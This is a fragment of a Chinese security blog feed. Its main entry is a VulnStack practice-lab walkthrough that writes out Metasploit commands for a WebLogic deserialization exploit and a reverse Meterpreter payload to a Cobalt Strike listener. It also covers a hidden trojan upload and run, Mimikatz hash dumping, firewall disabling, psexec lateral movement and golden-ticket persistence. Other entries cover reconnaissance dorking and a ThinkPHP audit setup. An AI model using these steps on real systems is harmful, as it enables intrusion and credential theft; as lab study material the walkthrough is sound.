f:</span><br><span class="line">            f.write(downloadimg.content)</span><br><span class="line">            f.close()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/22/python-Common-modules&scrapy/1587525885405.png" alt="1587525885405"></p>
<p><img src="/2020/04/22/python-Common-modules&scrapy/1587526178097.png" alt="1587526178097"></p>
<p>这个路图片路径是真的很难匹配，xpath和bs4都有点问题，最后还是正则表达式才匹配成功，所以以后要加强对这几个表达式的训练。这次练手先爬一些搞笑图片，下次爬妹子图片了，再下次…嘿嘿</p>
]]></content>
      <tags>
        <tag>python爬虫</tag>
        <tag>python学习</tag>
      </tags>
  </entry>
  <entry>
    <title>[域渗透]Vulnstack(二)</title>
    <url>/2020/07/14/Vulnstack%E4%BA%8C/</url>
    <content><![CDATA[<p><strong>[ATT&amp;CK实战]VulnStack红队（二)</strong></p>
<a id="more"></a>

<p><strong>ATT&amp;CK实战系列二</strong></p>
<p><strong>知识点</strong></p>
<blockquote>
<p>CVE-2019-2725</p>
<p>msfconsole</p>
<p>MS14-058 CVE-2014-4113提权</p>
<p>Cobaltstrike学习</p>
<p>黄金票据</p>
<p>。。。。。。</p>
</blockquote>
<h1 id="靶机描述"><a href="#靶机描述" class="headerlink" title="靶机描述"></a>靶机描述</h1><p><strong>靶机地址</strong>：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p>
<p>红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据/白银票据/Sid History/MOF等攻防技术。关于靶场统一登录密码：1qaz@WSX</p>
<blockquote>
<ol>
<li>Bypass UAC</li>
<li>Windows系统NTLM获取（理论知识：Windows认证）</li>
<li>Access Token利用（MSSQL利用）</li>
<li>WMI利用</li>
<li>网页代理，二层代理，特殊协议代理（DNS，ICMP）</li>
<li>域内信息收集</li>
<li>域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用</li>
<li>域凭证收集</li>
<li>后门技术（黄金票据/白银票据/Sid History/MOF）</li>
</ol>
</blockquote>
<p>拓补图<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594131272927.png" alt="1594131272927"></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594124640804.png" alt="1594124640804"></p>
<p>下载好靶机打开vmx文件即可，由于DMZ网段为192.168.111.0/24，所以需要将kali的子网ip设置为192.168.111.0<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594124806542.png" alt="1594124806542"></p>
<p>web机中需要手动开启服务，在 C:\Oracle\Middleware\user_projects\domains\base_domain\bin 下有一个startWeblogic 的批处理，使用管理员身份运，管理员账号密码：Administrator/1qaz@WSX</p>
<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594125481858.png" alt="1594125481858"></p>
<p>WEB机和PC机：计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;Server、Workstation、Computer Browser 全部启动</p>
<blockquote>
<p>kali攻击机ip:192.168.111.128</p>
<p>WEB机ip：192.168.111.80</p>
</blockquote>
<h1 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>靶机ip为192.168.111.80<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594125983232.png" alt="1594125983232"></p>
<p>端口扫描<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594127377707.png" alt="1594127377707"></p>
<p>发现开放了80和7001两个http端口，在80端口没有发现什么，7001端口为<code>WebLogic Server 10.3.6.0</code>，可使用weblogicscan进行扫描</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python3 WeblogicScan.py <span class="number">192.168</span><span class="number">.111</span><span class="number">.80</span> <span class="number">7001</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594128452876.png" alt="1594128452876">目标存在CVE-2019-2725漏洞，去网上搜索利用exp<br><a href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-2725" target="_blank" rel="noopener">https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-2725</a></p>
<p>最终在msf中发现了疑似可以利用的模块<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594129842386.png" alt="1594129842386"></p>
<h2 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">multi</span>/<span class="title">misc</span>/<span class="title">weblogic_deserialize_asyncresponseservice</span></span><br><span class="line"><span class="title">show</span> <span class="title">targets</span></span><br><span class="line"><span class="title">set</span> <span class="title">target</span> 1</span><br><span class="line"><span class="title">show</span> <span class="title">options</span></span><br><span class="line"><span class="title">set</span> <span class="title">rhosts</span> 192.168.111.80</span><br><span class="line"><span class="title">set</span> <span class="title">lhost</span> 192.168.111.128</span><br><span class="line"><span class="title">run</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594165461303.png" alt="1594165461303"></p>
<p>注意：这里要设置target，否则会显示恶心的<code>Exploit completed, but no session was created.</code>，不知道以前返回这个是否是因为未设置target</p>
<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="cobaltstrike学习"><a href="#cobaltstrike学习" class="headerlink" title="cobaltstrike学习"></a>cobaltstrike学习</h2><p>在做红日域渗透靶机一的时候由于学得很乱，所以便没有去学习cobaltstrike的使用，今天发现这个工具十分好用而且常用，所以在这里简单的学习一下</p>
<p>参考链接：<a href="https://www.cnblogs.com/wkzb/p/12431487.html" target="_blank" rel="noopener">https://www.cnblogs.com/wkzb/p/12431487.html</a><br><a href="https://klionsec.github.io/2017/09/23/cobalt-strike/" target="_blank" rel="noopener">https://klionsec.github.io/2017/09/23/cobalt-strike/</a></p>
<p>Cobaltstrike下载链接: <a href="https://pan.baidu.com/s/1oJPRfh6-2oOUUKJAF0I2_A" target="_blank" rel="noopener">https://pan.baidu.com/s/1oJPRfh6-2oOUUKJAF0I2_A</a> 提取码：3drd</p>
<p><strong>——cs启动——</strong></p>
<p>cabaltstrike 工具使用时分为服务端和客户端，启动服务端后可以有很多客户端连接，团队合作使用很方便，实验时也可以服务端客户端在一台机器启动。</p>
<p>服务端在 kali 启动，命令是：<code>./teamserver 本机 ip 连接密码</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">./teamserver <span class="number">192.168</span><span class="number">.111</span><span class="number">.128</span> test</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594195836891.png" alt="1594195836891"></p>
<p>客户端在物理机启动，双击cobaltstrike.bat即可，host填kali的ip，密码为刚才输入的test<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594196943183.png" alt="1594196943183"></p>
<p><strong>——msf派生权限——</strong></p>
<p>先在 cs 开启监听，Cobalt Strike-&gt;Listeners-Add，Name 随便填，Host 填写服务端kali的ip，Port 填写服务端设置的端口（在kali启动的时候可以看到<code>port 4444 started！</code>）</p>
<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594197235511.png" alt="1594197235511"></p>
<p>这个和web靶机的会话端口冲突，修改msf监听端口即可</p>
<p>这时我们需要已经获得一个shell的会话，将会话ctrl+z放到后台，执行msf命令</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">windows</span>/<span class="title">local</span>/<span class="title">payload_inject</span></span><br><span class="line"><span class="title">set</span> <span class="title">payload</span> <span class="title">windows</span>/<span class="title">meterpreter</span>/<span class="title">reverse_http</span></span><br><span class="line"><span class="title">set</span> <span class="title">DisablePayloadHandler</span> <span class="title">true</span>   #默认情况下，<span class="title">payload_inject</span>执行之后会在本地产生一个新的<span class="title">handler</span>，由于已经有了一个不需要再产生一个，所以这里设置为<span class="title">true</span></span><br><span class="line"><span class="title">set</span> <span class="title">lhost</span> <span class="title">xxxx</span>                   #<span class="title">cobaltstrike</span>监听的<span class="title">ip</span></span><br><span class="line"><span class="title">set</span> <span class="title">lport</span> <span class="title">xxxx</span>                  #<span class="title">cobaltstrike</span>监听的端口 </span><br><span class="line"><span class="title">set</span> <span class="title">session</span> 1                    #这里是当前获得的<span class="title">session</span>的<span class="title">id</span></span><br><span class="line"><span class="title">exploit</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594197974328.png" alt="1594197974328"></p>
<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594198066779.png" alt="1594198066779"></p>
<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594197995946.png" alt="1594197995946"></p>
<p>cobaltstrike成功监听到WEB机的shell，右键进入beacon界面即可执行命令<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594198165918.png" alt="1594198165918"></p>
<p>执行 shell 命令前面加上 shell 就可以了，例如 <code>shell dir</code><br>要使得 Beacon 每秒都多次连接到你，使用 sleep 0 命令。这是「交互式模式」。这种模式下命令 会立即执行</p>
<p><strong>——制作木马——</strong><br>首先创建监听器用于木马回连，Host 为 cs 服务端的 ip</p>
<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594199580654.png" alt="1594199580654"></p>
<p>Attacks-&gt;Packages-&gt;Windows Executable 再根据靶机的类型勾选，生成木马</p>
<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594199705068.png" alt="1594199705068"></p>
<p>生成木马之后将其复制到kali机里面，在msf的会话中使用upload进行上传</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">upload /root/artifact.exe C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\artifact.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594200777460.png" alt="1594200777460"></p>
<p>执行该木马，WEB机成功上线</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">execute <span class="comment">#在目标机中执行文件</span></span><br><span class="line">execute -H -i -f artifact.exe <span class="comment"># 创建新进程cmd.exe，-H不可见，-i交互</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594200913023.png" alt="1594200913023"></p>
<p><strong>——凭据存储——</strong></p>
<p>密码读取</p>
<blockquote>
<p>右键-&gt;Access-&gt;Dump Hashes（需要Administrator权限）</p>
<p>右键-&gt;Access-&gt;Run Mimikatz</p>
<p>之后再点击凭证信息</p>
<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594202264921.png" alt="1594202264921"></p>
</blockquote>
<p>基本的操作先学到这里，还有一个psexec传递在下文会学习，其它强大的功能远不于此，后面边用边学<del>.</del></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>右键-&gt;执行-&gt;提权</p>
<p>MS14-058 CVE-2014-4113为一个0day，可直接进行windows提权</p>
<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594210413819.png" alt="1594210413819"></p>
<p>成功提权为system权限</p>
<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594210692641.png" alt="1594210692641"></p>
<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><p><strong>获取当前组的计算机名</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>

<p>这里需要将防火墙手动关闭，否则会出现6118的错误</p>
<blockquote>
<p>第一种是刚刚msf反弹回来的输入<br>run post/windows/manage/enable_rdp<br>第二种是在菜刀命令终端下输入<br>netsh advfirewall set allprofiles state off</p>
</blockquote>
<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594203346183.png" alt="1594203346183"></p>
<p>未关闭防火墙只扫出来一个DC机器，将web和PC机器防火墙关闭后便能得到所有机器的信息<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594211521343.png" alt="1594211521343"></p>
<p><strong>查看所有域</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594203450088.png" alt="1594203450088"></p>
<p><strong>查看ip信息</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594211720611.png" alt="1594211720611"></p>
<p>得到为双网卡，内网 10.10.10.1/24 网段，域控 ip 10.10.10.10</p>
<p><strong>查看域名</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">shell net config workstation</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594212016261.png" alt="1594212016261"></p>
<p>这个命令需要在Administrator权限下使用，域名为<code>WEB.de1ay.com</code></p>
<p><strong>查看域内机器ip</strong></p>
<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594212157651.png" alt="1594212157651"></p>
<p><strong>查询域内用户</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">shell net user /domain	<span class="comment">#该命令在本环境中需要在system权限下执行</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594212327077.png" alt="1594212327077"></p>
<p><strong>查询域控机器</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">shell net group <span class="string">"Domain controllers"</span> /domain 	<span class="comment">#system权限下执行</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594212381537.png" alt="1594212381537"></p>
<p>得到域控机器为DC</p>
<p><strong>查询域管理员</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">shell net group <span class="string">"domain admins"</span> /domain</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594212497227.png" alt="1594212497227"></p>
<h2 id="psexec传递"><a href="#psexec传递" class="headerlink" title="psexec传递"></a>psexec传递</h2><p>psexec 是微软 pstools 工具包中最常用的一个工具，也是在内网渗透中的免杀渗透利器。psexec 能够在命令行下在对方没有开启 telnet 服务的时候返回一个半交互的命令行，像 telnet 客户端一样。原理是基于IPC共享，所以要目标打开 445 端口。另外在启动这个 psexec 建立连接之后对方机器上会被安装一个服务</p>
<blockquote>
<p>获取凭据后对目标网段进行端口存活探测，因为是 psexec 传递登录，这里仅需探测445端口</p>
<p>命令：<code>portscan ip网段 端口 扫描协议（arp、icmp、none） 线程</code></p>
<p>例如：<code>portscan 10.10.10.0/24 445 arp 200</code></p>
</blockquote>
<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594214618444.png" alt="1594214618444"></p>
<p>可看到域控机器DC开放了445端口</p>
<p>工具栏 View-&gt;Targets 查看端口探测后的存活主机<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594216367936.png" alt="1594216367936"></p>
<p>新建一个 Listener，Payload 选择 windows/beacon_smb/bind_pipe</p>
<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594216416085.png" alt="1594216416085"></p>
<p>存活主机右键-&gt;Login-&gt;psexec，选择之前获取到的凭据信息（明文密文均可），选择 Listener 及主机 Session</p>
<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594216434855.png" alt="1594216434855"></p>
<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594216719534.png" alt="1594216719534"></p>
<p>DC成功上线，这里会话需要选择Administrator才行，system权限试了几次没有成功</p>
<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594216809369.png" alt="1594216809369"></p>
<p>使用相同的方法可使PC机器上线<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594219729651.png" alt="1594219729651"></p>
<p>所有机器均上线成功</p>
<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p><strong>域控信息收集</strong></p>
<p>在域控中获得KRBTGT账户NTLM密码hash和SID<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594217354108.png" alt="1594217354108"></p>
<p><strong>黄金票据利用</strong></p>
<blockquote>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">黄金票据是伪造票据授予票据（TGT），也被称为认证票据。TGT仅用于向域控制器上的密钥分配中心</span><br><span class="line">（KDC）证明用户已被其他域控制器认证。</span><br><span class="line"></span><br><span class="line">黄金票据的条件要求：</span><br><span class="line"><span class="number">1.</span>域名称</span><br><span class="line"><span class="number">2.</span>域的SID值</span><br><span class="line"><span class="number">3.</span>域的KRBTGT账户NTLM密码哈希</span><br><span class="line"><span class="number">4.</span>伪造用户名</span><br><span class="line"></span><br><span class="line">原理这篇 https:<span class="comment">//www.freesion.com/article/6833306427/ 博客讲的很详细。</span></span><br><span class="line"></span><br><span class="line">黄金票据可以在拥有普通域用户权限和KRBTGT账号的哈希的情况下用来获取域管理员权限，上面已经获得域</span><br><span class="line">控的 system 权限了，还可以使用黄金票据做权限维持，当域控权限掉后，在通过域内其他任意机器伪造票</span><br><span class="line">据重新获取最高权限。</span><br></pre></td></tr></table></figure>
</blockquote>
<p>WEB机 Administrator 权限机器-&gt;右键-&gt;Access-&gt;Golden Ticket</p>
<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594217646994.png" alt="1594217646994"></p>
<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594217840245.png" alt="1594217840245"></p>
<p>这个靶机主要使用的是cs来操作，靶机一则通过端口转发 、metasploit+proxychains代理等方式来进行横向移动，域渗透需要学的还有很多，后面会不断练习来完善相关技能</p>
<p>参考文章：</p>
<p><a href="https://xz.aliyun.com/t/2536" target="_blank" rel="noopener">后渗透之meterpreter使用攻略</a></p>
<p><a href="https://www.cnblogs.com/wkzb/p/12431487.html" target="_blank" rel="noopener">cobaltstrike学习笔记</a></p>
<p><a href="https://wh0ale.github.io/2019/12/11/VulnStack%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/" target="_blank" rel="noopener">VulnStack域环境靶场渗透</a></p>
<p><a href="http://www.shangdixinxi.com/detail-1457905.html" target="_blank" rel="noopener">ATT&amp;CK实战系列——红队实战（二）</a></p>
<p><a href="https://www.freesion.com/article/6833306427/" target="_blank" rel="noopener">域渗透之（黄金票据利用）</a></p>
<p><a href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-2725" target="_blank" rel="noopener">CVE-2019-2725</a></p>
<p><a href="https://klionsec.github.io/2017/09/23/cobalt-strike/" target="_blank" rel="noopener">cobalt strike 快速上手 [ 一 ]</a></p>
]]></content>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集概述</title>
    <url>/2020/02/16/Information-collection/</url>
    <content><![CDATA[<p>​                                    <img src="/2020/02/16/Information-collection/0.jpg" alt="img"><a id="more"></a><strong>1.域名介绍</strong></p>
<p>域名（Domain Name），是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位。</p>
<p><strong>2.whois</strong></p>
<p>whois是用来查询域名的IP以及所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）</p>
<p>不同域名后缀的whois信息需要到不同的whois数据库查询。如.com的whois数据库和.edu的就不同。每个域名或IP的WHOIS信息由对应的管理机构保存，例如，以.com结尾的域名的WHOIS信息由.com域名运营商VeriSign管理，中国国家顶级域名.cn域名由CNNIC(中国互联网络信息中心)管理</p>
<p>whois协议。其基本内容是，先向服务器的TCP端口43建立一个连接，发送查询关键字并加上回车换行，然后接收服务器的查询结果。</p>
<p><strong>3.whois 查询</strong></p>
<p>Whois查询的重要性：通过Whois查询可以获得域名注册者邮箱地址等信息。一般情况下对于中小型网站域名注册者就是网站管理员。利用搜索引擎对Whois查询到的信息进行搜索，获取更多域名注册者的个人信息。</p>
<p>Whois查询方法：</p>
<p>1、Web接口查询：<a href="https://whois.aliyun.com/" target="_blank" rel="noopener">https://whois.aliyun.com/</a> 、 <a href="https://www.whois365.com/cn/" target="_blank" rel="noopener">https://www.whois365.com/cn/</a></p>
<p><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a> 、 <a href="https://whois.aizhan.com/" target="_blank" rel="noopener">https://whois.aizhan.com/</a></p>
<p>2、通过Whois命令行查询。</p>
<p>在Kali linux下自带了Whois查询工具，通过命令 whois 域名 进行查询。</p>
<p><strong>4.IPC备案查询方法</strong></p>
<p>Web接口查询：</p>
<p><a href="http://www.beianbeian.com/" target="_blank" rel="noopener">http://www.beianbeian.com/</a>  <a href="http://www.miitbeian.gov.cn/publish/query/indexFirst.action" target="_blank" rel="noopener">http://www.miitbeian.gov.cn/publish/query/indexFirst.action</a></p>
<p><a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a></p>
<p><strong>5.子域名介绍</strong></p>
<p>顶级域名：是”.com”、”.net”、”.org”、”.cn”等等。</p>
<p>子域名（Subdomain Name），凡顶级域名前加前缀的都是该顶级域名的子域名，而子域名根据技术的多少分为二级子域名，三级子域名以及多级子域名。</p>
<p><strong>6.子域名的作用</strong></p>
<p><strong>子域名是某个主域的二级域名或者多级域名，在防御措施严密情况下无法直接拿下主域，那么就可以采用迂回战术拿下子域名，然后无限靠近主域。</strong></p>
<p><strong>7.子域名挖掘方法</strong></p>
<p>1、子域名挖掘工具 如：Maltego CE、wydomain、subDomainsBrute、dnsmaper、Layer子域名挖掘机。</p>
<p>2、搜索引擎挖掘 如： 在Google中输入 site:<a href="http://sina.com/" target="_blank" rel="noopener">sina.com</a></p>
<p>3、第三方网站查询：<a href="http://tool.chinaz.com/subdomain" target="_blank" rel="noopener">http://tool.chinaz.com/subdomain</a>、<a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></p>
<p>4、证书透明度公开日志枚举：<a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a> 、<a href="http://censys.io/" target="_blank" rel="noopener">http://censys.io/</a></p>
<p>5、其他途径：<a href="https://phpinfo.me/domain" target="_blank" rel="noopener">https://phpinfo.me/domain</a> 、<a href="http://dns.aizhan.com/" target="_blank" rel="noopener">http://dns.aizhan.com</a></p>
<p><strong>8.挖漏洞思路</strong></p>
<p>针对某个具体SRC进行挖洞，如果直接针对主域进行渗透测试很可能是很难达到挖掘的效果。此时可以搜集对应的子域名，然后批量探测某些具体漏洞，从而更加快速容易的发现一些漏洞。之后将漏洞提交对应SRC获取奖金。</p>
<p>针对补天刷洞思路：对应没有指定厂商的刷洞，可以根据某些具体漏洞，通过URL采集获取目标，编写探测脚本批量探测，快速高效的刷洞。</p>
<p>注意：无论如何，都要保持警惕，不要触及不该触及的内容，不要影响公司业务，只做漏洞探测内容，确定存在漏洞即可。适可而止。</p>
<p><strong>9.敏感信息收集</strong></p>
<p>针对某些安全做的很好的目标，直接通过技术层面是无法完成渗透测试。在这种情况下，可以利用搜索引擎搜索目标暴露在互联网上的关联信息。例如：数据库文件、SQL注入、服务器配置信息、甚至是通过Git找到站点泄露源代码、以及Redis等未授权访问、robots.txt等敏感信息。从而达到渗透测试的目的。</p>
<p><strong>Google语法</strong></p>
<p>google hack是指使用Google等搜索引擎对某些特定的网络主机漏洞（通常是服务器上的脚本漏洞）进行搜索，以达到快速找到漏洞主机或特定主机的漏洞的目的。</p>
<table>
<thead>
<tr>
<th><strong>关键字</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>site</td>
<td>指定搜索域名 例如：site:<a href="http://baidu.com/" target="_blank" rel="noopener">baidu.com</a></td>
</tr>
<tr>
<td>inurl</td>
<td>指定URL中是否存在某些关键字 例如：inurl:.php?id=</td>
</tr>
<tr>
<td>intext</td>
<td>指定网页中是否存在某些关键字 例如：intext:网站管理</td>
</tr>
<tr>
<td>filetype</td>
<td>指定搜索文件类型 例如：filetype:txt</td>
</tr>
<tr>
<td>intitle</td>
<td>指定网页标题是否存在某些关键字 例如：intitle:后台管理</td>
</tr>
<tr>
<td>link</td>
<td>指定网页链接 例如：link:<a href="http://baidu.com/" target="_blank" rel="noopener">baidu.com</a> 指定与百度做了外链的站点</td>
</tr>
<tr>
<td>info</td>
<td>指定搜索网页信息  info:<a href="http://baidu.com/" target="_blank" rel="noopener">baidu.com</a></td>
</tr>
</tbody></table>
<p><strong>10.指纹识别</strong></p>
<p>云悉 <a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a> 、微步社区 <a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a> 、WhatWeb：<a href="https://whatweb.net/" target="_blank" rel="noopener">https://whatweb.net/</a></p>
<p><strong>11.旁站</strong></p>
<p>站长工具查询 （<a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">http://s.tool.chinaz.com/same</a> <a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">https://phpinfo.me/bing.php</a>）</p>
]]></content>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>[代码审计]ThinkPHP3.2.3</title>
    <url>/2020/05/05/ThinkPHP3.2.3/</url>
    <content><![CDATA[<h1 id="代码审计之Thinkphp3-2-3"><a href="#代码审计之Thinkphp3-2-3" class="headerlink" title="代码审计之Thinkphp3.2.3"></a>代码审计之Thinkphp3.2.3</h1><a id="more"></a>

<h1 id="MVC讲解"><a href="#MVC讲解" class="headerlink" title="MVC讲解"></a><strong>MVC讲解</strong></h1><p>MVC 和三层结构的认识</p>
<p>MVC 可以说是一种开发模式，三层结构是一种开发习惯，严格来讲，他们两者是完全不同的概念，但是在实际开发当中又有各种联系；</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">MVC  是一种将视图、控制、数据三者分开的一种开发模式；</span><br><span class="line">M  -  Model  模型  工作：编写 model 类，负责数据的操作</span><br><span class="line">V  -  View  视图（模板）  工作：编写 <span class="selector-tag">html</span>  文件，负责前台页面显示</span><br><span class="line">C  -  Controller  控制器  工作：编写类文件，IndexController<span class="selector-class">.class</span><span class="selector-class">.php</span></span><br></pre></td></tr></table></figure>

<p>参考链接：<a href="https://www.cnblogs.com/diyunfei/p/6752618.html" target="_blank" rel="noopener">https://www.cnblogs.com/diyunfei/p/6752618.html</a></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><a href="http://www.thinkphp.cn/donate/download/id/628.html" target="_blank" rel="noopener">下载地址</a><br><a href="http://document.thinkphp.cn/manual_3_2.html" target="_blank" rel="noopener">thinkphp3.2.3完全开发手册</a></p>
<p><a href="https://learnku.com/articles/16425/windows-phpstorm-xdebug-breakpoint-debugging" target="_blank" rel="noopener">phpstorm断点调试</a><br><a href="https://www.fuzzer.xyz/2019/03/05/Phpstorm+Xdebug%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E9%85%8D%E7%BD%AE/" target="_blank" rel="noopener">phpstorm断点设置</a></p>
<p>Thinkphp核心文件介绍：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">├─ThinkPHP 框架系统目录（可以部署在非web目录下面）</span><br><span class="line">│  ├─Common       核心公共函数目录</span><br><span class="line">│  ├─Conf         核心配置目录 </span><br><span class="line">│  ├─Lang         核心语言包目录</span><br><span class="line">│  ├─Library      框架类库目录</span><br><span class="line">│  │  ├─Think     核心Think类库包目录</span><br><span class="line">│  │  ├─Behavior  行为类库目录</span><br><span class="line">│  │  ├─Org       Org类库包目录</span><br><span class="line">│  │  ├─Vendor    第三方类库目录</span><br><span class="line">│  │  ├─ .      更多类库目录</span><br><span class="line">│  ├─Mode         框架应用模式目录</span><br><span class="line">│  ├─Tpl          系统模板目录</span><br><span class="line">│  ├─LICENSE<span class="selector-class">.txt</span>  框架授权协议文件</span><br><span class="line">│  ├─logo<span class="selector-class">.png</span>     框架LOGO文件</span><br><span class="line">│  ├─README<span class="selector-class">.txt</span>   框架README文件</span><br><span class="line">│  └─ThinkPHP<span class="selector-class">.php</span> 框架入口文件</span><br></pre></td></tr></table></figure>

<p>创建数据库并连接</p>
<blockquote>
<p>新建数据库<br>create database thinkphp3;    use thinkphp3;</p>
<p>新建表<br>create table thinkphp_user (id int(8) AUTO_INCREMENT PRIMARY KEY,username varchar(255),password varchar(255));</p>
<p>插入数据<br>insert into thinkphp_user value(1,’admin’,’admin’);</p>
</blockquote>
<p><img src="/2020/05/05/ThinkPHP3.2.3/1587617468272.png" alt="1587617468272"></p>
<p>然后连接数据库<br>在Application/Home/Conf/config.php里面配置，要配置的东西可以在Thinkphp/Conf/convention.php里面复制出来<img src="/2020/05/05/ThinkPHP3.2.3/1587629422032.png" alt="1587629422032"><br>测试数据库是否连接成功，可以在Application/Home/Controller里面的indexcontroller.class.php里面添加</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$data = M(<span class="string">'user'</span>)-&gt;where(<span class="string">'id=1'</span>)-&gt;select();</span><br><span class="line">	dump($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

